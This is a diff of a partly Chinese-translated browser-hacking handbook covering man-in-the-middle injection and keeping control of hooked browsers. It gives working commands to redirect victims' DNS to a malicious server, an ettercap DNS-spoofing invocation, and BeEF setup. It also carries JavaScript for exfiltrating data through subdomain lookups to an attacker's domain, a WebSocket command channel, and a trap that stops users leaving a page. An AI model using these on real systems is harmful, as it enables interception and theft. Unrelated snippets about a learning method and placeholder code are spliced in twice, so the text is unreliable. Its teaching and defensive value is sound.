+Second, you need to update the `autorun.rb` file. This specifies what modules to run as soon as new browsers are connected (hooked) into BeEF. You can see within the `@autorun_mods` array the modules that will be executed automatically.
 
 ```
 # RESTful API root endpoints
@@ -1165,15 +1135,15 @@ BEEF_PASSWD = "beef"
 
 With these two files configured, you’re ready to go. Perform the next steps in new terminal windows:
 
-Level1 **1.** Start BeEF (from within the appropriate folder): ruby beef. **2.** Start Shank: ruby shank.rb <target network address>. **3.** Start the autorun script: ruby autorun.rb. 
-
-/Level1
+1. Start BeEF (from within the appropriate folder): `ruby beef`
+2. Start Shank: `ruby shank.rb <target network address>`
+3. Start the autorun script: `ruby autorun.rb`
 
 After this is all done, you should see activity occurring in all three terminal windows. Of course, you can access the BeEF admin interface directly too: http://127.0.0.1:3000/ui/panel/.
 
 Taylor Pennington of CORE Security created a tool that performed similar ARP poisoning attacks combined with BeEF injection. You can view g0tBeEF here: [`github.com/kimj-1/g0tBeEF`](https://github.com/kimj-1/g0tBeEF).
 
-### DNS Poisoning
+# DNS Poisoning
 
 Although ARP poisoning is a great way to insert your computer between nodes on a local network, it doesn’t work in every situation. Another method to perform MitM attacks is to poison Domain Name System (DNS) records.
 
@@ -1183,55 +1153,47 @@ DNS works at multiple levels. First, the local DNS process within your computer 
 
 This gives you various places in which to poison DNS entries. For example, you can target a top-level DNS server, a lower-level DNS server, or even the target’s local DNS cache. If you can control any of these, you will be able to provide your own responses to the target. This means you’ll have an avenue to run your initiation code.
 
- start feature 
-* * *
-
-
-
-
-# **Tampering with a Client’s DNS Settings**
+## Tampering with a Client’s DNS Settings
 
 根据操作系统的不同，针对目标的 DNS 设置进行篡改的方法也有几种不同的实现方式。`Windows` 在现代 Windows 系统中，你可以通过将任意 DNS 条目添加到 `C:\Windows\System32\drivers\etc\hosts` 文件来插入自定义 DNS 记录。大多数情况下，需要管理员权限来更新该文件。条目格式为：`<IP 地址> <DNS 名称>`。例如，要让目标在尝试加载 Google 时被引导到你的服务器，只需在该文件中添加：
 
-``` 
+```
 <你的 IP 地址> www.google.com
 ```
 
 除了向本地 hosts 文件中插入任意记录外，还可以通过命令行更新特定网络接口的 Windows DNS 设置。你可以在受害机器上通过编写一个简单的批处理文件，或编译一个小程序来执行此操作。
 
-``` 
+```
 netsh interface ip set dns name="Local Area Connection"\
  source=static addr=<你的恶意 DNS 服务器 IP>
 ```
 
 可以将其简化为：
 
-``` 
+```
 netsh interface ip set dns "Local Area Connection" static <IP>
 ```
 
 `Linux/Unix/OS X` Linux、UNIX 和 OS X 系统将 hosts 文件存放在 `/etc/hosts`。该文件的格式与 Windows 类似，并且需要 root 权限即可更新。这些操作系统的 DNS 设置始终依赖于 `/etc/resolv.conf` 文件。拥有正确权限时，可以通过以下方式更新该文件：
 
-``` 
+```
 echo "nameserver <你的恶意 DNS 服务器 IP>" > /etc/resolv.conf
 ```
 
-* * *
-
-# **从本地网络层面影响 DNS**
+## 从本地网络层面影响 DNS
 
 利用 ARP 中毒攻击，如上文所述，你可以在本地网络中将自己的机器伪装成 DNS 服务器。
 
-Ettercap 提供一个名为 DNSSpoof 的模块，可自动执行此类攻击。首先，修改 `etter.dns` 文件以包含你的恶意 DNS 条目。在 Linux 系统上该文件通常位于 `/usr/share/ettercap/etter.dns`，而在 OSX 上则一般位于 `/opt/local/share/ettercap/etter.dns`。执行攻击时，你需要像之前一样运行 ettercap，但需指定插件：
+Ettercap 提供一个名为 DNSSpoof 的模块，可自动执行此类攻击。首先，修改 `etter.dns` 文件以包含你的恶意 DNS 条目。在 Linux 系统上该文件通常位于 `/usr/share/ettercap/etter.dns`，而在 OSX 上则一般位于 `/opt/local/share/ettercap/etter.dns`。执行攻击时，你需要像之前一样运行 `ettercap`，但需指定插件：
 
-``` 
+```
 ettercap -T -Q -P dns_spoof -M arp:remote \
  -i <网络接口> /<要中毒的目标 IP> //
 ```
 
 在上述所有示例中，一旦你控制了目标机器或网络的 DNS，就可以冒充任何试图通过名称访问的计算机或服务器。为了利用这种中间人（MitM）技术注入你的初始代码，建议先监控正常的网页流量，看是否存在代理服务器。若存在，代理是理想的目标，因为本地浏览器的流量本身就会指向该服务器。
 
-## **利用缓存**
+## 利用缓存
 
 Robert Hansen 发现浏览器在缓存非公共可路由 IP 地址（即 `10.0.0.0/8`、`172.16.0.0/12` 和 `192.168.0.0/16` 范围）时存在安全漏洞。Hansen 表明，在特定条件下，可以在源站中植入恶意逻辑。
 
@@ -1239,18 +1201,16 @@ Robert Hansen 发现浏览器在缓存非公共可路由 IP 地址（即 `10.0.0
 
 例如，目标可能在一家网络咖啡馆使用服务，而你同样拥有该网络的访问权限。利用 ARP 中继技术，你可以在网络中篡改所有 HTTP 请求（如前文所述）。你提前部署了一个 BeEF 服务器位于互联网上：
 
-**Level1 1.** 中继攻击进行期间，等待目标发出任意 HTTP 请求。随后，在响应中插入多个 `<iframe>`，加载你控制的每个目标 IP 的内容。  
-**2.** 返回你精心构造的数据，使其在浏览器中被缓存。每个 `<iframe>` 都包含指向你的 BeEF 服务器的初始化指令。  
-**3.** 当目标离开公共网络并重新连接到办公室或家庭网络时，浏览器仍会继续向 BeEF 服务器轮询。  
-**4.** 若目标随后访问私有 IP 地址（如其路由器的管理页面），之前缓存的内容将在该来源下执行。
-
-/Level1
+1. 中继攻击进行期间，等待目标发出任意 HTTP 请求。随后，在响应中插入多个 `<iframe>`，加载你控制的每个目标 IP 的内容。
+2. 返回你精心构造的数据，使其在浏览器中被缓存。每个 `<iframe>` 都包含指向你的 BeEF 服务器的初始化指令。
+3. 当目标离开公共网络并重新连接到办公室或家庭网络时，浏览器仍会继续向 BeEF 服务器轮询。
+4. 若目标随后访问私有 IP 地址（如其路由器的管理页面），之前缓存的内容将在该来源下执行。
 
 在特定的 VPN 条件下也可利用这些情况，但上述场景更为常见。之所以可能，是因为 JavaScript 在浏览器内部执行后，可能超出浏览器缓存，甚至在某些情况下影响 DNS 缓存。
 
 本节展示了无需发现 Web 应用漏洞，即可在浏览器中执行恶意代码的可能性。有时，仅仅拥有网络访问权限就足以将初始指令注入目标浏览器。
 
-# **总结**
+# 总结
 
 本章重点介绍了在利用浏览器信任时所面临的第一道障碍。我们尽力涵盖了恶意代码进入浏览器的多种方式，但这些方法并非 exhaustive。随着浏览器技术的不断演进，攻击面也会随之起伏——快速扩张的互联网、推动所有事物上线的趋势等因素都会影响其规模。
 
@@ -1258,91 +1218,61 @@ Robert Hansen 发现浏览器在缓存非公共可路由 IP 地址（即 `10.0.0
 
 当然，执行初始指令只是两个主要障碍中的第一个。你的下一个挑战是建立持久的浏览器通信通道。这将是你接下来的浏览器黑客之旅的下一步，将在下一章中进一步探讨。
 
-# **问题**
+# 问题
 
-Level1 **1.** 攻击者若成功在浏览器中执行代码，可能会执行哪些操作？  
-**2.** 请描述 XSS 攻击与常规 XSS 的主要区别。  
-**3.** 哪种浏览器控制可阻止 XSS 执行？  
-**4.** 请指出一个著名的 XSS “病毒”，并说明其传播方式。  
-**5.** 请描述一种攻击者可以入侵网站并植入恶意代码的方法。  
-**6.** 在什么情况下可以使用 sslstrip？  
-**7.** 请描述 ARP 中毒（ARP spoofing）。  
-**8.** 网络钓鱼（phishing）与垃圾邮件（SPAM）有何区别？  
-**9.** 请用简要步骤说明如何进行社会工程攻击。  
-**10.** 请描述一种物理“诱饵”技术。
-
-/Level1
+1. 攻击者若成功在浏览器中执行代码，可能会执行哪些操作？
+2. 请描述 XSS 攻击与常规 XSS 的主要区别。
+3. 哪种浏览器控制可阻止 XSS 执行？
+4. 请指出一个著名的 XSS “病毒”，并说明其传播方式。
+5. 请描述一种攻击者可以入侵网站并植入恶意代码的方法。
+6. 在什么情况下可以使用 `sslstrip`？
+7. 请描述 ARP 中毒（ARP spoofing）。
+8. 网络钓鱼（phishing）与垃圾邮件（SPAM）有何区别？
+9. 请用简要步骤说明如何进行社会工程攻击。
+10. 请描述一种物理“诱饵”技术。
 
 答案请参考书籍网站 [`browserhacker.com/answers`](https://browserhacker.com/answers) 或维基网站 [www.wiley.com/go/browserhackershandbook](http://www.wiley.com/go/browserhackershandbook)
 
-**Notes**
+## Notes
 
 1\. Netscape. (1995). Netscape and Sun announce JavaScript for enterprise networks and the Internet. Retrieved February 23, 2013 from [`web.archive.org/web/20070916144913/http://wp.netscape.com/newsref/pr/newsrelease67.html`](http://web.archive.org/web/20070916144913/http://wp.netscape.com/newsref/pr/newsrelease67.html)
 
 2\. Carnegie Mellon University. (2000). CERT® Advisory CA-2000-02 Malicious HTML Tags Embedded in Client Web Requests. Retrieved February 23, 2013 from [`www.cert.org/advisories/CA-2000-02.html`](http://www.cert.org/advisories/CA-2000-02.html)
 
-3\. Jeremiah Grossman. (2006). The origins of Cross-Site Scripting (XSS). Retrieved February 23, 2013 from [`jeremiahgrossman.blogspot.com.au/2006/07/origins-of-cross-site-scripting-xss.html`](http://jeremiahgrossman.blogspot.com.au/2006/07/origins-of-cross-site-scripting-xss.html)
 
 
-
-
+3. Jeremiah Grossman. (2006). The origins of Cross-Site Scripting (XSS). Retrieved February 23, 2013 from [`jeremiahgrossman.blogspot.com.au/2006/07/origins-of-cross-site-scripting-xss.html`](http://jeremiahgrossman.blogspot.com.au/2006/07/origins-of-cross-site-scripting-xss.html)
 4. `Jon Oberheide`。 (2011)。 How I Almost Won Pwn2Own via XSS。 Retrieved March 3, 2013 from [`http://jon.oberheide.org/blog/2011/03/07/how-i-almost-won-pwn2own-via-xss/`](http://jon.oberheide.org/blog/2011/03/07/how-i-almost-won-pwn2own-via-xss/)
-
 5. `Roi Saltzman`。 (2009)。 Google Chrome Universal XSS Vulnerability。 Retrieved March 4, 2013 from [`http://blog.watchfire.com/wfblog/2009/04/google-chrome-universal-xss-vulnerability-.html`](http://blog.watchfire.com/wfblog/2009/04/google-chrome-universal-xss-vulnerability-.html)
-
 6. `Wade Alcorn`。 (2005)。 The Cross-site Scripting Virus。 Retrieved February 23, 2013 from [`http://www.bindshell.net/papers/xssv.html`](http://www.bindshell.net/papers/xssv.html)
-
 7. `Robert Hansen`。 (2008)。 Diminutive Worm Contest Wrapup。 Retrieved February 23, 2013 from [`http://ha.ckers.org/blog/20080110/diminutive-worm-contest-wrapup/`](http://ha.ckers.org/blog/20080110/diminutive-worm-contest-wrapup/)
-
 8. `Mario Heiderich`, `Jorg Schwenk`, `Tilman Frosch`, `Jonas Magazinius`, `Edward Yang`。 (2013)。 mXSS attacks: attacking well-secured web applications by using innerHTML mutations。 Retrieved October 19, 2013 from [`https://cure53.de/fp170.pdf`](https://cure53.de/fp170.pdf)
-
 9. `Ryan Barnett`。 (2013)。 ModSecurity XSS Evasion Challenge Results。 Retrieved February 23, 2013 from [`http://from%20http://blog.spiderlabs.com/2013/09/modsecurity-xss-evasion-challenge-results.html`](http://from%20http://blog.spiderlabs.com/2013/09/modsecurity-xss-evasion-challenge-results.html)
-
 10. `Gareth Heyes`。 (2012)。 XSS technique without parentheses。 Retrieved February 23, 2013 from [`http://www.thespanner.co.uk/2012/05/01/xss-technique-without-parentheses/`](http://www.thespanner.co.uk/2012/05/01/xss-technique-without-parentheses/)
-
 11. `Matt Johansen` and `Jeremiah Grossman`。 (2013)。 Million Browser Botnet。 Retrieved October 19, 2013 from [`https://media.blackhat.com/us-13/us-13-Grossman-Million-Browser-Botnet.pdf`](https://media.blackhat.com/us-13/us-13-Grossman-Million-Browser-Botnet.pdf)
-
 12. `Andrew Levin`。 (2007)。 File:PhishingTrustedBank.png。 Retrieved February 23, 2013 from [`http://en.wikipedia.org/wiki/File:PhishingTrustedBank.png`](http://en.wikipedia.org/wiki/File:PhishingTrustedBank.png)
-
 13. `Maltego`。 (2012)。 Maltego: What is Maltego?。 Retrieved February 23, 2013 from [`http://www.paterva.com/web6/products/maltego.php`](http://www.paterva.com/web6/products/maltego.php)
-
 14. `Christian Martorella`。 (2013)。 theHarvester information gathering。 Retrieved February 23, 2013 from [`http://code.google.com/p/theharvester/`](http://code.google.com/p/theharvester/)
-
 15. `BBC`。 (2004)。 Passwords revealed by sweet deal。 Retrieved February 23, 2013 from [`http://news.bbc.co.uk/2/hi/technology/3639679.stm`](http://news.bbc.co.uk/2/hi/technology/3639679.stm)
-
 16. `John Leyden`。 (2012)。 That square QR barcode on the poster? Check it’s not a sticker。 Retrieved February 23, 2013 from [`http://www.theregister.co.uk/2012/12/10/qr_code_sticker_scam/`](http://www.theregister.co.uk/2012/12/10/qr_code_sticker_scam/)
-
 17. `Google`。 (2012)。 Google Chart Tools。 Retrieved March 3, 2013 from [`https://developers.google.com/chart/`](https://developers.google.com/chart/)
-
 18. `Google`。 (2012)。 Safe Browsing API。 Retrieved March 3, 2013 from [`https://developers.google.com/safe-browsing/`](https://developers.google.com/safe-browsing/)
-
 19. `Amit Klein`。 (2010)。 The Golden Hour of Phishing Attacks。 Retrieved February 23, 2013 from [`http://www.trusteer.com/blog/golden-hour-phishing-attacks`](http://www.trusteer.com/blog/golden-hour-phishing-attacks)
-
 20. `Limor S. Kessem`。 (2013)。 Laser Precision Phishing--Are You on the Bouncer’s List Today?。 Retrieved February 23, 2013 from [`http://blogs.rsa.com/laser-precision-phishing-are-you-on-the-bouncers-list-today/`](http://blogs.rsa.com/laser-precision-phishing-are-you-on-the-bouncers-list-today/)
-
 21. `Doug MacDonald` and `Derek Manky`。 (2009)。 Zeus: God of DIY Botnets。 Retrieved October 19, 2013 from [`http://www.fortiguard.com/analysis/zeusanalysis.html`](http://www.fortiguard.com/analysis/zeusanalysis.html)
-
 22. `Scott Fluhrer`, `Itsik Mantin` and `Adi Shamir`。 (2001)。 Weaknesses in the Key Scheduling Algorithm of RC4。 Retrieved February 23, 2013 from [`http://aboba.drizzlehosting.com/IEEE/rc4_ksaproc.pdf`](http://aboba.drizzlehosting.com/IEEE/rc4_ksaproc.pdf)
-
 23. `Thomas d’Otreppe`。 (2012)。 Aircrack-ng。 Retrieved February 23, 2013 from [`http://www.aircrack-ng.org/doku.php?id=Main`](http://www.aircrack-ng.org/doku.php?id=Main)
-
 24. `Dino A. Dai Zovi` and `Shane Macaulay`。 (2006)。 KARMA Wireless Client Security Assessment Tools。 Retrieved February 23, 2013 from [`http://www.theta44.org/karma/`](http://www.theta44.org/karma/)
-
 25. `Russell Davies`。 (2012)。 Upside-Down-TernetHowTo。 Retrieved February 23, 2013 from [`https://help.ubuntu.com/community/Upside-Down-TernetHowTo`](https://help.ubuntu.com/community/Upside-Down-TernetHowTo)
-
 26. `Pete Lamonica`。 (2013)。 Siri Proxy。 Retrieved February 23, 2013 from [`https://github.com/plamoni/SiriProxy`](https://github.com/plamoni/SiriProxy)
-
 27. `Alberto Ornaghi`, `Marco Valleri`, `Emilio Escobar`, `Eric Milam`, and `Gianfranco Costamagna`。 (2013)。 Ettercap — A suite for man in the middle attacks。 Retrieved February 23, 2013 from [`https://github.com/Ettercap/ettercap`](https://github.com/Ettercap/ettercap)
-
 28. `Dug Song`。 (2002)。 Dsniff。 Retrieved February 23, 2013 from [`http://monkey.org/~dugsong/dsniff/`](http://monkey.org/~dugsong/dsniff/)
-
 29. `Ryan Linn` and `Steve Ocepek`。 (2012)。 Hookin’ Ain’t Easy--BeEF Injection with MITM。 Retrieved February 23, 2013 from [`http://media.blackhat.com/bh-us-12/Briefings/Ocepek/BH_US_12_Ocepek_Linn_BeEF_MITM_WP.pdf`](http://media.blackhat.com/bh-us-12/Briefings/Ocepek/BH_US_12_Ocepek_Linn_BeEF_MITM_WP.pdf)
-
 30. `Robert Hansen`。 (2009)。 RFC1918 Caching Security Issues。 Retrieved March 6, 2013 from [`http://www.sectheory.com/rfc1918-security-issues.htm`](http://www.sectheory.com/rfc1918-security-issues.htm)
 
 # *Chapter 3*
 
-# *Retaining Control*
+## *Retaining Control*
 
 There is limited value in getting your foot in the door if that door gets slammed within moments. In Chapter 2, you learned how to get your foot in the door. Now you need to learn how to keep that door open. In hacking terms, this means that once you have captured the initial control of the browser, you will need to retain it. This is where the Retaining Control phase of the browser hacking methodology comes in.
 
@@ -1352,32 +1282,30 @@ As you will see in the following chapters, many attacks need time for execution,
 
 This chapter covers numerous techniques for retaining control of your target browser to give you time to complete your attack. However, you should not consider the methods an exhaustive list. You might already know some of them; others are less known, and some will work only on specific browser types and versions.
 
-# Understanding Control Retention
+### Understanding Control Retention
+
+
 
 Retaining control of your target is trickier than just executing your initial instructions. Unless you’re able to somehow inject code into every page, you will lose control when the target navigates away. Ideally, retaining your control over a browser should take place not only in the face of network disconnections, but regardless of what sites the user may be visiting.
 
+- [费曼学习法](https://wiki.example.org/feynmans_learning_method)的灵感源于诺贝尔物理奖获得者`Richard Feynman`。
 
-
--   [费曼学习法](https://wiki.example.org/feynmans_learning_method)的灵感源于诺贝尔物理奖获得者**Richard Feynman**。
-
-1.  运用费曼技巧，你只需花上`20 min`就能深入理解知识点，而且记忆深刻，*难以遗忘*。
+1. 运用费曼技巧，你只需花上`20 min`就能深入理解知识点，而且记忆深刻，*难以遗忘*。
 
 ```
 if (condVar > someVal) {console.log("xxx")}
 ```
 
+- [闭包非常适合用于添加新的动态代码，因为在闭包内部声明的私有变量（使用 `var` 声明）隐藏在全局作用域之外。使用闭包，你可以将环境数据与在该数据上运行的函数关联起来。]
 
+- 如果你多次提交前面的代码，将其逻辑封装进闭包是强制性的，以“隔离”新代码到其自身的函数中。按照 BeEF 的分类学，剩余的示例被称为 **command modules**（命令模块），因为它们是浏览器可以执行的新命令。
 
--   [闭包非常适合用于添加新的动态代码，因为在闭包内部声明的私有变量（使用 `var` 声明）隐藏在全局作用域之外。使用闭包，你可以将环境数据与在该数据上运行的函数关联起来。]
+- 闭包的概念可以扩展，用于创建一个包装器，向堆栈中添加命令模块。每当轮询请求完成后，`stack.pop()` 确保移除堆栈的最后一个元素，然后执行该元素。
 
--   如果你多次提交前面的代码，将其逻辑封装进闭包是强制性的，以“隔离”新代码到其自身的函数中。按照 BeEF 的分类学，剩余的示例被称为 **command modules**（命令模块），因为它们是浏览器可以执行的新命令。
+- 下面的代码是该思路的样本实现。为了简洁，锁对象和 `poll()` 函数已被排除：
 
--   闭包的概念可以扩展，用于创建一个包装器，向堆栈中添加命令模块。每当轮询请求完成后，`stack.pop()` 确保移除堆栈的最后一个元素，然后执行该元素。
-
--   下面的代码是该思路的样本实现。为了简洁，锁对象和 `poll()` 函数已被排除：
-
-``` 
-/**
+```
+ /**
  * 命令堆栈。
  */
 `commands`: new `Array()`,
@@ -1496,7 +1424,7 @@ end figure
 
 下面的代码展示了一个非常简单的 Ruby Web 服务器与被钩住浏览器之间的通信示例。该 Ruby WebSocket 服务器基于 **EM-WebSocket** 库（或 gem）实现，它是一个基于 EventMachine 的异步且高速实现：
 
-``` 
+```
 require 'em-websocket'
 EventMachine.run {
 EventMachine::WebSocket.start(
@@ -1517,7 +1445,6 @@ end
 ```
 
 该代码段在 6666 端口绑定 WebSocket 服务器，等待客户端发送新消息。收到消息后，会向客户端发送一个新命令。你会发现这与前文的 `XMLHttpRequest` 示例相似：都使用了匿名函数 `function(){alert(1)}`。为了简化，这里没有使用之前的 `execute()` 包装器和闭包，但如果需要，这段代码可以轻松地改造以支持闭包方式的执行。
-
 
 客户端代码使用原生 WebSocket API 编写。当 WebSocket 通道打开时，客户端会向服务器发送消息，请求更多指令。当服务器回复时，onmessage 事件会被触发，服务器发送的数据会被执行，从而创建一个新的 Function 对象。通过 WebSocket 通道传输的数据可以是 String、Blob 或 ArrayBuffer 类型。在此情况下，类型为 String，这意味着代码需要通过 new Function() 实例化后进行评估。我们假设攻击服务器和发送的 JavaScript 代码是默认受信任的，因此使用 Function 这种方式比使用 eval 更安全。
 
@@ -1622,17 +1549,19 @@ window.postMessage() 可以用于在不同窗口之间（如 IFrames、弹窗、
 
  start figure 
 
-**Figure 3-5:** window.postMessage() 支持情况在常见浏览器中的表现
+
+
+### Figure 3-5: `window.postMessage()` 支持情况在常见浏览器中的表现
 
 ![c03f005.tif](img/c03f005.png)
 
- end figure 
+end figure
 
-Internet Explorer 版本 8 到 10 只能部分支持 postMessage()，而 WebSocket 协议是完全受支持的（参见注 9）。这也是您可能希望将 postMessage() 设为主要通信通道的原因（前提是被钩浏览器不是 Internet Explorer）。
+Internet Explorer 版本 8 到 10 只能部分支持 `postMessage()`，而 `WebSocket` 协议是完全受支持的（参见注 9）。这也是您可能希望将 `postMessage()` 设为主要通信通道的原因（前提是被钩浏览器不是 Internet Explorer）。
 
 ## 使用 DNS 隧道通信
 
-如前所述，所有讨论过的通信通道均依赖 HTTP 协议。WebSocket 协议是例外，但其初始握手仍然依赖于一个被 HTTP 服务器解释为 Upgrade 请求的 HTTP 请求，例如：
+如前所述，所有讨论过的通信通道均依赖 HTTP 协议。`WebSocket` 协议是例外，但其初始握手仍然依赖于一个被 HTTP 服务器解释为 Upgrade 请求的 HTTP 请求，例如：
 
 ```
 GET /ws HTTP/1.1
@@ -1644,16 +1573,13 @@ Origin: http://browservictim.com
 Sec-WebSocket-Version: 13
 ```
 
-除非您正在针对没有直接连接的浏览器（例如位于 HTTP 代理后面、会记录并可能检查内容的浏览器），否则这里没有问题。这时，基于 DNS 的通信通道可能会派上用场，并结合其他规避技术，以降低被检测的可能性。只有少数安全解决方案监控 DNS 请求，11 而且它们的效果往往受到质疑，因为大多数现代浏览器使用 DNS 预取（DNS prefetching）来提升加载未来资源的响应速度。
+除非您正在针对没有直接连接的浏览器（例如位于 HTTP 代理后面、会记录并可能检查内容的浏览器），否则这里没有问题。这时，基于 DNS 的通信通道可能会派上用场，并结合其他规避技术，以降低被检测的可能性。只有少数安全解决方案监控 DNS 请求，11 而且它们的效果往往受到质疑，因为大多数现代浏览器使用 DNS prefetching（DNS 预取）来提升加载未来资源的响应速度。
 
-Kenton Born 在 2010 年的 BlackHat 会议上发表了研究 12，展示了如何利用浏览器自身的 DNS  covert channel。该方法在单向数据从浏览器到服务器的场景下非常有效，但如果通信需要双向进行，则实现会更加复杂。
+Kenton Born 在 2010 年的 BlackHat 会议上发表了研究 12，展示了如何利用浏览器自身的 DNS covert channel。该方法在单向数据从浏览器到服务器的场景下非常有效，但如果通信需要双向进行，则实现会更加复杂。
 
+- 你可以创建一个基于 DNS 的单向数据泄漏通道，发送请求到精心构造的域名，这些域名由你受控的 DNS 服务器解析。该通道可以用于向客户端传递对称密钥，以便在随后的 HTTP 请求和响应中加密客户端与服务器之间交换的数据。例如，如果你想通过这种技术发送字符串 “ABCDE”，可以将其编码后作为子域名解析请求提交。如果你的 DNS 服务器解析 `browserhacker.com`，你只需请求一个图像资源即可发送数据负载，例如 `<img src="_encodedData_.browserhacker.com">`。生成 `_encodedData_` 的简单 JavaScript 函数可能如下：
 
-
-
--   [你可以创建一个基于 DNS 的单向数据泄漏通道，发送请求到精心构造的域名，这些域名由你受控的 DNS 服务器解析。该通道可以用于向客户端传递对称密钥，以便在随后的 HTTP 请求和响应中加密客户端与服务器之间交换的数据。例如，如果你想通过这种技术发送字符串 “ABCDE”，可以将其编码后作为子域名解析请求提交。如果你的 DNS 服务器解析 browserhacker.com，你只需请求一个图像资源即可发送数据负载，例如 <img src="_encodedData_.browserhacker.com">。生成 _encodedData_ 的简单 JavaScript 函数可能如下：
-
-``` 
+```
 encode_data = function(str) {
   var result="";
   for(i=0;i<str.length;++i) {
@@ -1667,15 +1593,15 @@ var _encodedData_ = encodeURI(encode_data(data));
 console.log(_encodedData_);
 ```
 
-上述代码之所以需要，是因为域名只能包含字母数字字符以及连字符（-）和点（.）. encode_data() 的结果（使用前面示例中的 data）为：
+上述代码之所以需要，是因为域名只能包含字母数字字符以及连字符（-）和点（.）. `encode_data()` 的结果（使用前面示例中的 `data`）为：
 
-``` 
+```
 646174615F746F657874727564655F66726F6D5F636C69656E745F746F5F736572766572
 ```
 
 需要考虑的另一个限制是 FQDN（完全限定域名）长度限制为 255 个字符（包括点）。基于这些限制，前面的代码片段可以通过以下方式扩展：
 
-``` 
+```
 var max_domain_length = 255;
 var max_segment_length = max_domain_length - 
   "browserhacker.com".length;
@@ -1707,7 +1633,7 @@ for (seq=1; seq<=segments.length; seq++) {
 
 根据你使用的攻击域名长度以及前面讨论的 FQDN 限制，前面的代码片段负责将编码数据分割成类似下面的块：
 
-``` 
+```
 .EA.A9.8F.EA.A9.8C.EA.A9.8D.EA.A9.8A.EA.A9.8B
 ```
 
@@ -1721,41 +1647,41 @@ for (seq=1; seq<=segments.length; seq++) {
 
 在下面的示例（如 Figure 3-6 所示），域名 `bit-00000002-0000003d.browserhacker.com` 根据是否能解析返回 1 或 0。
 
-start figure 
+start figure
 
 **Figure 3-6:** 解析域名
 
 ![c03f006.eps](img/c03f006.png)
 
-end figure 
+end figure
 
-在 Figure 3-6 中，查询了两个不同的域名，为了突出差异，箭头指向每个请求中细微不同的字符。一个域名能解析，另一个不能。这就是 DNS 隧道中位状态检测的基础。在此例中，当位被设为 true 时，会返回 IP 地址 74.125.237.136。其原因在本节后面说明，并在 Figures 3-7 和 3-8 中展示。
+在 Figure 3-6 中，查询了两个不同的域名，为了突出差异，箭头指向每个请求中细微不同的字符。一个域名能解析，另一个不能。这就是 DNS 隧道中位状态检测的基础。在此例中，当位被设为 true 时，会返回 IP 地址 `74.125.237.136`。其原因在本节后面说明，并在 Figures 3-7 和 3-8 中展示。
 
-start figure 
+start figure
 
 **Figure 3-7:** 返回 1 位
 
 ![c03f007.eps](img/c03f007.png)
 
-end figure 
+end figure
 
 Figure 3-7 展示了通过 DNS 隧道返回 1 位的过程。图像成功加载（跨域）后，`onload` 函数被调用，用于标记位的 true 状态。
 
-start figure 
+start figure
 
 **Figure 3-8:** 返回 0 位
 
 ![c03f008.eps](img/c03f008.png)
 
-end figure 
+end figure
 
 Figure 3-8 展示了通过 DNS 隧道传输信息的过程，但这一次传输的是 0 位。图像加载失败（域名不存在），`onerror` 函数被调用，用于标记位的 0 状态。
 
 二进制传输过程会与浏览器通信到你控制的 DNS 服务器，告诉它应该返回哪个 IP 地址以表示 true 状态。随后，服务器可以通过该隧道向浏览器传输数据。
 
-下面的代码示例演示如何从 DNS 隧道中获取字符串（获取 IP 地址的步骤已被省略以简化演示）。IP 地址 74.125.237.136 已硬编码在 DNS 隧道服务器中。
+下面的代码示例演示如何从 DNS 隧道中获取字符串（获取 IP 地址的步骤已被省略以简化演示）。IP 地址 `74.125.237.136` 已硬编码在 DNS 隧道服务器中。
 
-``` 
+```
 // 从 DNS 隧道获取字符串（IP 地址已硬编码）
 var targetIP = "74.125.237.136";
 
@@ -1787,106 +1713,115 @@ var bitValue = resolveAndGetChar(domain); // 1 或 0
 console.log("Bit value:", bitValue);
 ```
 
+- [费曼学习法](https://wiki.example.org/feynmans_learning_method)的灵感源于诺贝尔物理奖获得者**Richard Feynman**。
 
-
--   [费曼学习法](https://wiki.example.org/feynmans_learning_method)的灵感源于诺贝尔物理奖获得者**Richard Feynman**。
-
-1.  运用费曼技巧，你只需花上`20 min`就能深入理解知识点，而且记忆深刻，*难以遗忘*。
+1. 运用费曼技巧，你只需花上`20 min`就能深入理解知识点，而且记忆深刻，*难以遗忘*。
 
 ```
 if (condVar > someVal) {console.log("xxx")}
 ```
 
+- 使用浏览器事件
 
+你是否见过网站在关闭前要求确认的情况？这种行为在某些网站上会非常烦人，尤其是当网站每次点击“确定”后仍然弹出相同的确认框时。
 
+这正是你可以让受控目标在特定页面上停留更长时间的方法。在某些情况下，停留在钩钓页面几秒钟可以让更多的命令模块被执行。记住，停留时间越长，越好。
 
--   使用浏览器事件  
-    你是否见过网站在关闭前要求确认的情况？这种行为在某些网站上会非常烦人，尤其是当网站每次点击“确定”后仍然弹出相同的确认框时。
+该技术依赖于处理 `window` 对象的 `onbeforeunload` 事件，默认触发条件包括：
 
-    这正是你可以让受控目标在特定页面上停留更长时间的方法。在某些情况下，停留在钩钓页面几秒钟可以让更多的命令模块被执行。记住，停留时间越长，越好。
+* 当 `unload` 事件发生时 — — 你关闭了当前标签页、整个浏览器，或简单地离开页面
+* 当调用 `window.close` 或 `document.close` 时
+* 当调用 `location.replace` 或 `location.reload` 时
 
-    该技术依赖于处理 `window` 对象的 `onbeforeunload` 事件，默认触发条件包括：
+以下是一个在所有桌面浏览器（Opera 12 之前除外）中均可工作的基本实现：
 
-    *   当 `unload` 事件发生时 —  — 你关闭了当前标签页、整个浏览器，或简单地离开页面  
-    *   当调用 `window.close` 或 `document.close` 时  
-    *   当调用 `location.replace` 或 `location.reload` 时  
+```javascript
+function display_confirm(){
+  if(confirm("Are you sure you want to navigate away from this  
+    page?\n\n There is currently a request to the server pending.  
+    You will lose recent changes by navigating away.\n\n Press OK   
+    to continue, or Cancel to stay on the current page.")){
+    display_confirm();
+  }
+}
 
-    以下是一个在所有桌面浏览器（Opera 12 之前除外）中均可工作的基本实现：
+function dontleave(e){
+  e = e || window.event;
 
-    ```javascript
-    function display_confirm(){
-      if(confirm("Are you sure you want to navigate away from this  
-        page?\n\n There is currently a request to the server pending.  
-        You will lose recent changes by navigating away.\n\n Press OK   
-        to continue, or Cancel to stay on the current page.")){
-        display_confirm();
-      }
+  // 如果是 Internet Explorer，语法略有不同
+  if(browser.isIE()){
+    e.cancelBubble = true;
+    e.returnValue = "There is currently a request to the server 
+      pending. You will lose recent changes by navigating away.";
+  }else{
+    if (e.stopPropagation) {
+      e.stopPropagation();
+      e.preventDefault();
+      e.returnValue = "There is currently a request to the server   
+        pending. You will lose recent changes by navigating away.";
     }
+  }
 
-    function dontleave(e){
-      e = e || window.event;
+  // 重新显示确认框，让用户点击“确定”时感到烦扰
+  display_confirm();
+  return "There is currently a request to the server pending. You  
+    will lose recent changes by navigating away.";
+}
 
-      // 如果是 Internet Explorer，语法略有不同
-      if(browser.isIE()){
-        e.cancelBubble = true;
